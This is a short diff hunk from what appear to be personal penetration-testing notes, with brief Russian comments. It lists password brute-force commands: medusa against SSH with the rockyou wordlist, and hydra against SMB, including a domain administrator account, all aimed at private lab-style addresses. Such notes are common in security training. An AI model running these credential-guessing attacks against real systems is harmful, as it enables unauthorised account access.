@@ -7,6 +7,7 @@ medusa -h 192.168.50.38 -u michael -P rockyou.txt -M ssh -f -v 6
 (почему то для домена) 
 
 hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"
+
 hydra -L ~/wordlists/user.txt -P ~/wordlists/pass.txt 192.168.1.5 smb -V
 
 (не для домена)
